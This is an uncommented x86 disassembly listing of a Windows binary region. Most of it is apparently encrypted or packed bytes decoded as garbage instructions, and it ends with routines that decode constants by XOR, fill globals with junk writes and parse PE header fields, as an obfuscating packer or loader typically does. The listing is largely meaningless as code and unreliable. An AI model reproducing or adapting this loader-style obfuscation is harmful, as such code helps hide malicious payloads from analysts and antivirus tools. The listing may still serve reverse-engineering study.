  40f256:	and    DWORD PTR [ecx+ecx*8+0x75ff4aef],ebp
  40f25d:	clc    
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx-0x1c9e9827]
  40f282:	mov    ebp,0x7c7caa61
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f226
  40f28c:	cmp    bh,cl
  40f28e:	sbb    DWORD PTR [edi-0x1e065f25],ebp
  40f294:	prefetch (bad)
  40f295:	or     eax,0xbc47f0d9
  40f29a:	in     eax,dx
  40f29b:	cmc    
  40f29c:	ins    DWORD PTR es:[edi],dx
  40f29d:	jo     0x40f25d
  40f29f:	mov    DWORD PTR [edx],esi
  40f2a1:	in     al,0x21
  40f2a3:	inc    edx
  40f2a4:	sub    DWORD PTR [ebp+0x7bc9be8c],edi
  40f2aa:	mov    WORD PTR [edi-0x2e],?
  40f2ad:	cld    
  40f2ae:	adc    BYTE PTR [ebp-0xc573359],0x20
  40f2b5:	test   DWORD PTR [ecx],esp
  40f2b7:	or     bh,BYTE PTR [ecx-0x72]
  40f2ba:	rol    BYTE PTR fs:[esi-0x245f07d],1
  40f2c1:	out    dx,al
  40f2c2:	mov    WORD PTR [eax+0x5953b1ad],?
  40f2c8:	jnp    0x40f266
  40f2ca:	jae    0x40f342
  40f2cc:	inc    ebp
  40f2cd:	jnp    0x40f25e
  40f2cf:	pop    eax
  40f2d0:	ret    0xb120
  40f2d3:	rol    BYTE PTR [esp+eax*2+0x71],0x28
  40f2d8:	cmp    BYTE PTR [edi+0x1d2c3dba],dh
  40f2de:	popf   
  40f2df:	ficom  DWORD PTR [eax+esi*4-0x6e6aea29]
  40f2e6:	mov    dh,0xb9
  40f2e8:	daa    
  40f2e9:	retf   
  40f2ea:	xor    DWORD PTR [edi+edx*1+0x76301272],edx
  40f2f1:	sub    dh,BYTE PTR [ecx]
  40f2f3:	daa    
  40f2f4:	sub    eax,0xf4c77ab7
  40f2f9:	pusha  
  40f2fa:	arpl   WORD PTR [edi-0x41bfa570],bx
  40f300:	mov    BYTE PTR [ebp+0x29fb4dd7],bl
  40f306:	pushf  
  40f307:	addr16 mov edi,0xa197df23
  40f30d:	xor    DWORD PTR [esi],esi
  40f30f:	adc    eax,0x876249ee
  40f314:	xor    dl,dl
  40f316:	ds xbegin 0xad171ca5
  40f31d:	push   edx
  40f31e:	out    dx,al
  40f31f:	addr16 push ecx
  40f321:	jmp    0x3a45:0x1d50040f
  40f328:	sub    eax,0x691d9e4e
  40f32d:	mov    eax,0x6ae0ce7e
  40f332:	je     0x40f32e
  40f334:	pop    esi
  40f335:	mov    dh,0xe9
  40f337:	dec    esi
  40f338:	clc    
  40f339:	addr16 and eax,0x57dde345
  40f33f:	retf   0x799c
  40f342:	inc    edi
  40f343:	mov    esp,esi
  40f345:	push   eax
  40f346:	ds sahf 
  40f348:	xor    eax,0x5a7a2ea5
  40f34d:	xchg   DWORD PTR [edi-0x47],edi
  40f350:	not    dl
  40f352:	mov    eax,0x3fcdae38
  40f357:	xchg   ecx,eax
  40f358:	mov    es,WORD PTR [ebx+0x33]
  40f35b:	stos   DWORD PTR es:[edi],eax
  40f35c:	mov    ds:0x83a035ba,al
  40f361:	fmulp  st(7),st
  40f364:	int    0x55
  40f366:	in     eax,dx
  40f367:	loop   0x40f2fe
  40f369:	mov    esi,0xa6d1a8ac
  40f36e:	xor    DWORD PTR [ebx+0x32bab995],ebx
  40f374:	icebp  
  40f375:	sub    al,0x9d
  40f377:	mov    DWORD PTR [ebx+0x43],esi
  40f37a:	inc    edx
  40f37c:	in     eax,0x93
  40f37e:	pop    edx
  40f37f:	push   ebp
  40f380:	push   esi
  40f381:	test   eax,0x5a7e3a8
  40f386:	and    dh,al
  40f388:	mov    WORD PTR [edi+0x4647732c],ds
  40f38e:	sahf   
  40f38f:	dec    eax
  40f390:	es sbb ch,bl
  40f393:	out    dx,al
  40f394:	mov    ch,0x5b
  40f396:	and    BYTE PTR ss:[edx+0x31],dh
  40f39a:	addr16 test eax,0x11c8b9c8
  40f3a0:	jecxz  0x40f3a8
  40f3a2:	call   0x82b0:0x37120fce
  40f3a9:	mov    ds:0x32256d16,eax
  40f3ae:	xor    ebp,DWORD PTR [esi+0x2b]
  40f3b1:	into   
  40f3b2:	repz int 0x40
  40f3b5:	(bad)  
  40f3b7:	inc    esp
  40f3b8:	adc    ecx,edi
  40f3ba:	out    0x64,al
  40f3bc:	outs   dx,BYTE PTR ds:[esi]
  40f3bd:	push   es
  40f3be:	call   0x459a89e1
  40f3c3:	adc    dl,bh
  40f3c5:	out    0x19,al
  40f3c7:	aad    0x9a
  40f3c9:	fwait
  40f3ca:	sbb    eax,0xfa3d63
  40f3cf:	and    BYTE PTR [edx],bh
  40f3d1:	lock cmp DWORD PTR [eax],edx
  40f3d4:	mov    WORD PTR [ecx-0x37],ds
  40f3d7:	jl     0x40f421
  40f3d9:	es inc edx
  40f3db:	dec    eax
  40f3dc:	or     dl,BYTE PTR [ebx+0xe6e5c6d]
  40f3e2:	pop    esi
  40f3e3:	xchg   edx,eax
  40f3e4:	loopne 0x40f3b1
  40f3e6:	scas   al,BYTE PTR es:[edi]
  40f3e7:	mov    ch,0x7d
  40f3e9:	xchg   ebp,eax
  40f3ea:	das    
  40f3eb:	pop    es
  40f3ec:	xchg   esi,eax
  40f3ed:	push   0x9ec20ea
  40f3f2:	jl     0x40f3cf
  40f3f4:	xchg   DWORD PTR [ebp+0xf],ebx
  40f3f7:	mov    ds:0x3f26f677,eax
  40f3fc:	imul   esp,DWORD PTR [edi+0x12],0x4fd81b15
  40f403:	xor    eax,0xdeeb3d62
  40f408:	idiv   DWORD PTR [edx*1+0x19c066af]
  40f40f:	aam    0x9c
  40f411:	cwde   
  40f412:	sbb    eax,0x32ddf06
  40f417:	gs je  0x40f3f3
  40f41a:	arpl   WORD PTR [esi],bx
  40f41c:	sbb    BYTE PTR [esp+eax*2-0x6cd94966],dh
  40f423:	aaa    
  40f424:	les    esp,FWORD PTR [ebx+ecx*2]
  40f427:	adc    BYTE PTR [edi+0x18876650],bh
  40f42d:	retfw  0x6b4e
  40f431:	push   ecx
  40f432:	arpl   WORD PTR [eax],bx
  40f434:	dec    ecx
  40f435:	pop    ebx
  40f436:	btr    ebp,edi
  40f439:	mov    esi,0x57f5b4c8
  40f43e:	popa   
  40f43f:	adc    BYTE PTR [edx+0x6bbc8e02],0xcf
  40f446:	xor    edi,DWORD PTR [ecx-0x5a70860a]
  40f44c:	test   al,0x92
  40f44e:	into   
  40f44f:	pop    edx
  40f450:	mov    edi,0x707d6dd7
  40f455:	jmp    0x70b3314a
  40f45a:	pop    ebp
  40f45b:	je     0x40f4c3
  40f45d:	nop
  40f45e:	sub    esp,esi
  40f460:	xor    bl,BYTE PTR fs:[ecx]
  40f463:	sub    eax,0x3cd61582
  40f468:	fisttp DWORD PTR ds:0x75b4e8eb
  40f46e:	sub    BYTE PTR ds:0x26eacf4a,dh
  40f474:	sub    ecx,DWORD PTR [eax-0x58]
  40f477:	fwait
  40f478:	xor    DWORD PTR [ecx-0x5c],esi
  40f47b:	xor    ebx,DWORD PTR ds:[ebx]
  40f47e:	pop    DWORD PTR [ecx-0x42205f69]
  40f484:	jne    0x40f45f
  40f486:	jecxz  0x40f47f
  40f488:	xor    eax,0xb2d88556
  40f48d:	inc    eax
  40f48e:	push   esi
  40f48f:	out    dx,eax
  40f490:	ins    DWORD PTR es:[edi],dx
  40f491:	ficom  DWORD PTR [ebx+0x3ae55ece]
  40f497:	jno    0x40f431
  40f499:	inc    edi
  40f49a:	(bad)  
  40f49c:	mov    DWORD PTR [ebx-0x43],esp
  40f49f:	xchg   esp,eax
  40f4a0:	mov    ah,0x53
  40f4a2:	or     ebx,0x7d
  40f4a5:	inc    ebx
  40f4a6:	lods   eax,DWORD PTR ds:[esi]
  40f4a7:	nop
  40f4a8:	add    al,0xaf
  40f4aa:	pop    esi
  40f4ab:	nop    ecx
  40f4ae:	cmp    dh,ah
  40f4b0:	popf   
  40f4b1:	mov    esi,0x939ba5d8
  40f4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4b7:	mov    bh,0xe3
  40f4b9:	sti    
  40f4ba:	adc    bl,BYTE PTR [ebx-0x44]
  40f4bd:	mov    ebx,0x5315fb08
  40f4c2:	rcr    DWORD PTR [esp+edi*2+0x3d],1
  40f4c6:	hlt    
  40f4c7:	ror    BYTE PTR fs:[edi-0x1b8b2b10],0xf1
  40f4cf:	aad    0x6c
  40f4d1:	xlat   BYTE PTR ds:[ebx]
  40f4d2:	sbb    DWORD PTR [ecx],edi
  40f4d4:	outs   dx,DWORD PTR ds:[esi]
  40f4d5:	lds    esp,FWORD PTR [edx+0x15]
  40f4d8:	int3   
  40f4d9:	mov    ebp,0xe1339ee1
  40f4de:	inc    ebx
  40f4df:	nop
  40f4e0:	fisubr WORD PTR [esi-0x2a]
  40f4e3:	cld    
  40f4e4:	push   cs
  40f4e5:	cmp    DWORD PTR [esi+0x42],ebx
  40f4e8:	outs   dx,DWORD PTR ds:[esi]
  40f4e9:	or     BYTE PTR [ecx*2+0x41feb75a],0x9
  40f4f1:	xor    eax,0x81e5f381
  40f4f6:	jae    0x40f4d3
  40f4f8:	cli    
  40f4f9:	adc    BYTE PTR [ecx+0x47cd1ef0],ch
  40f4ff:	push   ss
  40f500:	inc    esp
  40f501:	fsincos 
  40f503:	int3   
  40f504:	sahf   
  40f505:	js     0x40f560
  40f507:	sub    eax,0x4e0df1b6
  40f50c:	mov    bl,0x2b
  40f50e:	(bad)  
  40f50f:	fld    QWORD PTR [edx]
  40f511:	adc    al,0x1e
  40f513:	repz or eax,0x8545e4f7
  40f519:	pop    es
  40f51a:	jge    0x40f514
  40f51c:	fwait
  40f51d:	push   ss
  40f51e:	sub    al,0xf9
  40f520:	and    eax,0x2df8bcca
  40f525:	push   cs
  40f526:	outs   dx,BYTE PTR ds:[esi]
  40f527:	mov    ebx,0xa909398a
  40f52c:	mov    WORD PTR [ebx+0x7ca6ff77],ss
  40f532:	inc    esp
  40f533:	xor    eax,DWORD PTR [ecx+0x7f]
  40f536:	cld    
  40f537:	shr    DWORD PTR cs:[edi+edx*4-0x5b],1
  40f53c:	add    al,0x6a
  40f53e:	sub    eax,0x35f54842
  40f543:	jb     0x40f4c5
  40f545:	fldenv [edx+ebx*1+0x1e]
  40f549:	mov    cs,WORD PTR [ecx+0x3b8c1e2e]
  40f54f:	dec    ecx
  40f550:	fistp  DWORD PTR [eax]
  40f552:	push   edx
  40f553:	fs jle 0x40f4dd
  40f556:	fimul  WORD PTR [eax-0x3e]
  40f559:	inc    eax
  40f55a:	push   ds
  40f55b:	pop    ecx
  40f55c:	sbb    BYTE PTR [esi+0x79],dl
  40f55f:	sbb    DWORD PTR [ecx+0x64b8f697],edi
  40f565:	mov    DWORD PTR [ecx],esi
  40f567:	sub    bh,ch
  40f569:	cmc    
  40f56a:	cmp    cl,BYTE PTR ds:0x985a59e7
  40f570:	dec    edi
  40f571:	adc    eax,DWORD PTR [ecx]
  40f573:	mov    BYTE PTR [esi-0x7d],dh
  40f576:	xchg   ebp,eax
  40f577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f578:	inc    ecx
  40f579:	push   ebx
  40f57a:	push   esp
  40f57b:	icebp  
  40f57c:	sbb    bh,BYTE PTR [ebx]
  40f57e:	or     al,0xa1
  40f580:	dec    ecx
  40f581:	lahf   
  40f582:	cmp    eax,0x1fe469f2
  40f587:	mov    ah,0x40
  40f589:	aaa    
  40f58a:	rcl    BYTE PTR [edi-0x16660d20],1
  40f590:	push   0x7278d958
  40f595:	push   es
  40f596:	xor    esp,eax
  40f598:	mov    dh,0x80
  40f59a:	(bad)  
  40f59b:	mov    edx,0x83d0265f
  40f5a0:	add    eax,0xe8f028cf
  40f5a5:	mov    ds:0xfd53e6a6,al
  40f5aa:	loopne 0x40f590
  40f5ac:	jmp    0xfa56:0x67590645
  40f5b3:	jecxz  0x40f595
  40f5b5:	pop    ss
  40f5b6:	stos   DWORD PTR es:[edi],eax
  40f5b7:	pop    edx
  40f5b8:	inc    ebp
  40f5b9:	hlt    
  40f5ba:	mov    DWORD PTR [edx],0xb8fef3d7
  40f5c0:	test   BYTE PTR [ecx-0x56],bl
  40f5c3:	xor    dh,BYTE PTR [edx-0x5ddb996c]
  40f5c9:	sub    BYTE PTR [edx],ah
  40f5cb:	push   edx
  40f5cc:	dec    edx
  40f5cd:	inc    eax
  40f5ce:	out    0x4,eax
  40f5d0:	sub    eax,0xdca9c28f
  40f5d5:	sbb    eax,0xdf428ad2
  40f5da:	into   
  40f5db:	or     BYTE PTR [edx+eax*4],cl
  40f5de:	out    dx,al
  40f5df:	sbb    eax,0x961e3879
  40f5e4:	xchg   edi,eax
  40f5e5:	fdivr  QWORD PTR [edx+0x49]
  40f5e8:	cmp    DWORD PTR [ecx-0x7],edx
  40f5eb:	mov    al,ds:0x6e7c0c02
  40f5f0:	std    
  40f5f1:	pop    DWORD PTR [esi+0xb]
  40f5f4:	mov    eax,0x1f382786
  40f5f9:	shr    BYTE PTR [esi+0x1a],0xea
  40f5fd:	mov    edx,0xfd68f9e0
  40f602:	ss add al,0x83
  40f605:	int3   
  40f606:	ins    DWORD PTR es:[di],dx
  40f608:	ret    
  40f609:	frstor [ecx-0x6e]
  40f60c:	inc    eax
  40f60d:	ror    esp,cl
  40f60f:	call   DWORD PTR [ebx-0x31671d18]
  40f615:	fisubr DWORD PTR [edi+ecx*8+0x54]
  40f619:	jae    0x40f5a6
  40f61b:	or     ch,bl
  40f61d:	ss or  eax,0x6c0ed395
  40f623:	and    eax,eax
  40f625:	lock dec esp
  40f627:	ja     0x40f627
  40f629:	das    
  40f62a:	adc    bh,dh
  40f62c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f62d:	fild   QWORD PTR [edx-0x3f]
  40f630:	(bad)  
  40f631:	pusha  
  40f632:	inc    ebp
  40f633:	call   0xd03bf96
  40f638:	add    BYTE PTR [ebp-0x75],dl
  40f63b:	in     al,dx
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x4336ef,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x4336df,0x4336a3
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0xb619cecd
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0x617c7c7e
  40f67b:	or     ebp,DWORD PTR [edi+0x12fa30ed]
  40f681:	jnp    0x40f6c9
  40f683:	and    eax,DWORD PTR [esi*8-0x57a79f30]
  40f68a:	inc    ebp
  40f68b:	daa    
  40f68c:	inc    ebp
  40f68d:	jb     0x40f6c3
  40f68f:	dec    esi
  40f690:	jne    0x40f6ea
  40f692:	enter  0x7860,0x32
  40f696:	xchg   edx,eax
  40f697:	push   eax
  40f698:	inc    ebx
  40f699:	ds jae 0x40f642
  40f69c:	add    al,0xb4
  40f69e:	shr    ebx,0x57
  40f6a1:	test   esi,0x2b8f1ec3
  40f6a7:	stc    
  40f6a8:	xor    BYTE PTR [ebp+0x6b120050],ch
  40f6ae:	leave  
  40f6af:	add    al,0x51
  40f6b1:	push   eax
  40f6b2:	into   
  40f6b3:	cmp    dl,BYTE PTR [eax]
  40f6b5:	and    eax,0xc934b4b3
  40f6ba:	push   ebx
  40f6bb:	cmp    esi,esi
  40f6bd:	add    edi,DWORD PTR [ecx]
  40f6bf:	rol    DWORD PTR ds:0xfeb87547,0x65
  40f6c6:	mov    al,0xa4
  40f6c8:	and    DWORD PTR [ecx-0x64d74331],esi
  40f6ce:	xor    cl,BYTE PTR [ebp-0x2b387e99]
  40f6d4:	pop    ss
  40f6d5:	in     al,dx
  40f6d6:	sahf   
  40f6d7:	xlat   BYTE PTR ds:[ebx]
  40f6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6d9:	call   0xee38:0xf364e523
  40f6e0:	rol    BYTE PTR [ecx],cl
  40f6e2:	cmp    al,0xc6
  40f6e4:	das    
  40f6e5:	jecxz  0x40f6a7
  40f6e7:	shr    BYTE PTR [eax+edi*1-0x12eb1338],1
  40f6ee:	fs dec ebp
  40f6f0:	inc    ebx
  40f6f1:	mov    ds:0x68c44980,eax
  40f6f6:	sub    DWORD PTR [esi-0x5e],0x52b60746
  40f6fd:	mov    fs,WORD PTR ds:0x486c3b5a
  40f703:	mov    eax,0x8b72609a
  40f708:	and    DWORD PTR [ebx],eax
  40f70a:	fst    DWORD PTR ds:0xf5531f1a
  40f710:	ficom  DWORD PTR [ebx]
  40f712:	adc    al,0x55
  40f714:	ret    0x1372
  40f717:	mov    edx,0x763ef192
  40f71c:	jle    0x40f712
  40f71e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f71f:	jae    0x40f6a3
  40f721:	inc    esp
  40f722:	mov    bh,BYTE PTR [edx+0x25]
  40f725:	sub    dh,cl
  40f727:	xor    eax,0x4e30682
  40f72c:	mov    ebp,0x4d06ba95
  40f731:	mov    ebx,0xfd02a1e
  40f736:	lods   eax,DWORD PTR ds:[esi]
  40f737:	dec    esi
  40f738:	sbb    eax,0xd87a725
  40f73d:	loopne 0x40f719
  40f73f:	cmp    ah,BYTE PTR [ebx+0x23]
  40f742:	test   eax,0x838a2197
  40f747:	cmp    edi,esi
  40f749:	or     BYTE PTR [eax+0x62],cl
  40f74c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f74d:	lea    ebx,[ecx-0x2093a499]
  40f753:	add    BYTE PTR [eax+0x10cfe9e5],dl
  40f759:	bound  ecx,QWORD PTR ds:0xa6399964
  40f75f:	xor    eax,0xcc32cb64
  40f764:	and    bh,BYTE PTR [ebx-0x3005d941]
  40f76a:	mov    bh,bh
  40f76c:	or     ebp,ebp
  40f76e:	mov    eax,0xde4b5145
  40f773:	adc    al,BYTE PTR ds:0x3d5bdb66
  40f779:	push   esi
  40f77a:	cmp    al,0x94
  40f77c:	loopne 0x40f78b
  40f77e:	sub    eax,0xc5483618
  40f783:	xor    al,0x89
  40f785:	mov    edx,0xc6e3744
  40f78a:	dec    bp
  40f78c:	cwde   
  40f78d:	ror    DWORD PTR [ebx+ecx*4],cl
  40f790:	in     al,0x2e
  40f792:	clc    
  40f793:	mov    DWORD PTR ds:0x3322350,ecx
  40f799:	je     0x40f7fb
  40f79b:	(bad)  
  40f79c:	aam    0xe
  40f79e:	pusha  
  40f79f:	inc    eax
  40f7a0:	cs jl  0x40f80a
  40f7a3:	mov    ecx,0x3c3043fb
  40f7a8:	mov    bl,0x7a
  40f7aa:	fbld   TBYTE PTR [ecx]
  40f7ac:	pop    ds
  40f7ad:	fsubr  DWORD PTR [edx+ebp*1+0x5b]
  40f7b1:	xchg   ecx,eax
  40f7b2:	inc    edx
  40f7b4:	leave  
  40f7b5:	nop
  40f7b6:	mov    ebx,0x899eefcb
  40f7bb:	inc    ebp
  40f7bc:	lds    esi,FWORD PTR [eax]
  40f7be:	ja     0x40f7a9
  40f7c0:	xchg   ecx,eax
  40f7c1:	dec    ebp
  40f7c2:	jbe    0x40f746
  40f7c4:	inc    eax
  40f7c5:	js     0x40f815
  40f7c7:	mov    ch,0x27
  40f7c9:	aad    0xb8
  40f7cb:	xor    dl,BYTE PTR [ecx+edi*8+0x2f]
  40f7cf:	or     edi,ebp
  40f7d1:	test   al,0xd9
  40f7d3:	xor    eax,0xf67ac86a
  40f7d8:	sar    DWORD PTR [eax+edi*2],1
  40f7db:	inc    edx
  40f7dc:	(bad)  
  40f7dd:	mov    dh,0x0
  40f7df:	pop    esp
  40f7e0:	cmp    DWORD PTR es:[edi+0x69],0xc8f82042
  40f7e8:	push   ss
  40f7e9:	or     eax,DWORD PTR [edx+0x181858b9]
  40f7ef:	jecxz  0x40f866
  40f7f1:	pop    eax
  40f7f2:	adc    eax,0x42660e7d
  40f7f7:	dec    esi
  40f7f8:	fdivr  QWORD PTR [edi-0x54ae0810]
  40f7fe:	es inc ebx
  40f800:	adc    edi,DWORD PTR [edi]
  40f802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f803:	cmp    al,0x9
  40f805:	cwde   
  40f806:	stc    
  40f807:	sbb    DWORD PTR [edi],ebx
  40f809:	rcl    DWORD PTR [esi+0x3f],0x1b
  40f80d:	sub    BYTE PTR [edx+0x4d],dl
  40f810:	(bad)
  40f813:	sub    ecx,DWORD PTR [ebx+0x79ac538f]
  40f819:	push   0x1d
  40f81b:	dec    ebx
  40f81c:	fwait
  40f81d:	dec    ebx
  40f81e:	xor    ebp,DWORD PTR [ecx-0xec59336]
  40f824:	jb     0x40f84d
  40f826:	popf   
  40f827:	push   edi
  40f828:	out    dx,al
  40f829:	in     eax,0x75
  40f82b:	jp     0x40f880
  40f82d:	xlat   BYTE PTR ds:[ebx]
  40f82e:	daa    
  40f82f:	out    0xac,al
  40f831:	cmp    ebp,esp
  40f833:	add    ecx,DWORD PTR [eax-0x3c]
  40f836:	fcomp  QWORD PTR [edx-0x3f1b09bd]
  40f83c:	ja     0x40f88f
  40f83e:	pop    es
  40f83f:	int3   
  40f840:	sbb    al,0xe5
  40f842:	xor    al,0xa6
  40f844:	add    BYTE PTR [eax+0x32],0xa4
  40f848:	inc    esi
  40f849:	push   0xffffffd9
  40f84b:	jbe    0x40f8b2
  40f84d:	cmp    ebp,eax
  40f84f:	mov    esi,0xaeb505fe
  40f854:	test   DWORD PTR [eax],esi
  40f856:	xchg   BYTE PTR [edx-0x7],dh
  40f859:	int3   
  40f85a:	loopne 0x40f899
  40f85c:	cwde   
  40f85d:	push   ebx
  40f85e:	cmp    ah,BYTE PTR [esi-0x33bc3ddf]
  40f864:	imul   ecx,DWORD PTR [edi-0x58f1cc66],0xffffff90
  40f86b:	inc    ecx
  40f86c:	inc    ebx
  40f86d:	lods   eax,DWORD PTR ds:[esi]
  40f86e:	int    0xa7
  40f870:	ret    0x7bd1
  40f873:	add    DWORD PTR ds:0x4532aa1b,ebp
  40f879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f87a:	nop
  40f87b:	mov    ds:0xe33e89f9,eax
  40f880:	mul    BYTE PTR ds:0x242d667a
  40f886:	ins    BYTE PTR es:[edi],dx
  40f887:	and    esp,esi
  40f889:	add    BYTE PTR [edx-0x28f50481],bh
  40f88f:	push   edi
  40f890:	test   al,0x7
  40f892:	(bad)  
  40f893:	lds    ebp,FWORD PTR [edi]
  40f895:	mov    ebp,0x51555dee
  40f89a:	push   es
  40f89b:	fidivr WORD PTR [esi]
  40f89d:	cdq    
  40f89e:	and    BYTE PTR [eax],al
  40f8a0:	pop    eax
  40f8a1:	sbb    dl,BYTE PTR [ebp-0x75]
  40f8a4:	mov    edi,0x77087a29
  40f8a9:	fdecstp 
  40f8ab:	and    bh,BYTE PTR [ecx-0x4e]
  40f8ae:	lds    ecx,FWORD PTR [ecx-0x69de7d]
  40f8b4:	mov    ebx,0x9edac142
  40f8b9:	push   di
  40f8bb:	adc    bl,BYTE PTR [edi]
  40f8bd:	dec    esi
  40f8be:	sub    al,0x18
  40f8c0:	shl    DWORD PTR [edi],cl
  40f8c2:	in     al,0x98
  40f8c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8c5:	aas    
  40f8c6:	sub    edx,DWORD PTR [edx]
  40f8c8:	daa    
  40f8c9:	and    BYTE PTR ds:0x69df8cb0,ah
  40f8cf:	xchg   esi,eax
  40f8d0:	mov    edi,0x3834842
  40f8d5:	ins    BYTE PTR es:[edi],dx
  40f8d6:	jo     0x40f878
  40f8d8:	gs cld 
  40f8da:	or     dl,BYTE PTR cs:[edx+0x618431ea]
  40f8e1:	sub    DWORD PTR [eax+0x6b],0xe65ec99b
  40f8e8:	push   ebp
  40f8e9:	lea    ecx,[ecx-0x48]
  40f8ec:	dec    edx
  40f8ed:	push   esp
  40f8ee:	aaa    
  40f8ef:	mul    BYTE PTR [esi+edi*8-0x32]
  40f8f3:	jmp    0xd5d22811
  40f8f8:	adc    BYTE PTR [edi+0x4554424],cl
  40f8fe:	and    bl,dl
  40f900:	imul   edi,edx,0x43d070a0
  40f906:	pusha  
  40f907:	(bad)  
  40f908:	cmc    
  40f909:	repz (bad) 
  40f90b:	(bad)  
  40f90c:	xchg   ecx,eax
  40f90d:	and    DWORD PTR [esp+ebp*8],eax
  40f910:	jle    0x40f918
  40f912:	xchg   esi,ebx
  40f914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f915:	jne    0x40f8e8
  40f917:	inc    eax
  40f918:	cmp    al,0xb4
  40f91a:	cdq    
  40f91b:	stos   DWORD PTR es:[edi],eax
  40f91c:	inc    ecx
  40f91d:	call   0x8b0a93a5
  40f922:	push   esp
  40f923:	mov    ebx,0x813904c4
  40f928:	and    eax,0x43372b
  40f92d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f92e:	ss inc ebx
  40f930:	add    BYTE PTR [eax*2-0x7af03cc4],dh
  40f937:	add    DWORD PTR [eax],0xca130000
  40f93d:	mov    eax,DWORD PTR [ebp+0x8]
  40f940:	movzx  ecx,WORD PTR ds:0x43365f
  40f947:	add    DWORD PTR ds:0x433647,ecx
  40f94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40f950:	add    ecx,DWORD PTR [eax+0x3c]
  40f953:	sub    DWORD PTR ds:0x43372f,0x5c72
  40f95d:	mov    edx,0x7510853
  40f962:	add    DWORD PTR ds:0x433717,0x767c
  40f96c:	mov    DWORD PTR [ebp+0x8],ecx
  40f96f:	adc    eax,DWORD PTR ds:0x4336a7
  40f975:	mov    eax,DWORD PTR [ebp-0x4]
  40f978:	movzx  ecx,BYTE PTR ds:0x433763
  40f97f:	adc    ecx,DWORD PTR ds:0x4336ab
  40f985:	mov    DWORD PTR ds:0x433763,ecx
  40f98b:	xor    eax,edx
  40f98d:	push   esi
  40f98e:	xor    esi,0x76d3
  40f994:	mov    esi,DWORD PTR [ebp+0x8]
  40f997:	mov    ecx,0x32729a
  40f99c:	add    eax,ecx
  40f99e:	cmp    DWORD PTR [esi+0x54],eax
  40f9a1:	pop    esi
  40f9a2:	je     0x40f9b0
  40f9a8:	mov    eax,DWORD PTR [ebp+0x8]
  40f9ab:	jmp    0x40f9c9
  40f9b0:	mov    eax,DWORD PTR [ebp-0x4]
  40f9b3:	xor    eax,edx
  40f9b5:	add    eax,ecx
  40f9b7:	jmp    0x40f9c9
  40f9bc:	mov    eax,DWORD PTR [ebp-0x4]
  40f9bf:	xor    eax,0x7510853
  40f9c4:	add    eax,0x32729a
  40f9c9:	leave  
  40f9ca:	ret    0x4
  40f9cd:	push   ebp
  40f9ce:	mov    ebp,esp
  40f9d0:	push   ecx
  40f9d1:	mov    ecx,DWORD PTR [ebp+0x8]
  40f9d4:	mov    eax,0x7510853
  40f9d9:	or     DWORD PTR ds:0x4336b3,0x4336af
  40f9e3:	xor    ecx,eax
  40f9e5:	add    DWORD PTR ds:0x433723,0x6057
  40f9ef:	add    ecx,0x32729a
  40f9f5:	mov    DWORD PTR ds:0x433697,0x14d8
  40f9ff:	mov    DWORD PTR [ebp+0x10],ecx
  40fa02:	mov    ecx,0x737
  40fa07:	mov    DWORD PTR [ebp+0x8],0xf34ceb9
  40fa0e:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40fa15:	mov    DWORD PTR ds:0x4336db,edi
  40fa1b:	mov    ecx,0xf89c8534
  40fa20:	mov    DWORD PTR ds:0x433647,0x6b28
  40fa2a:	push   esi
  40fa2b:	mov    esi,DWORD PTR ds:0x43375f
  40fa31:	mov    DWORD PTR [ebp+0x10],0x70019fb
  40fa38:	mov    esi,DWORD PTR [ebp-0x4]
  40fa3b:	cmp    ecx,esi
  40fa3d:	mov    DWORD PTR ds:0x4336e3,0x9e9
  40fa47:	je     0x40fa8c
  40fa4d:	mov    esi,DWORD PTR [ebp+0xc]
  40fa50:	sbb    DWORD PTR ds:0x433733,0x4336a7
  40fa5a:	xor    ecx,eax
  40fa5c:	xor    DWORD PTR ds:0x43371b,0x6006
  40fa66:	xor    esi,eax
  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x4336af,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43371b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x4336a3,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x43365f,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x43365f,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
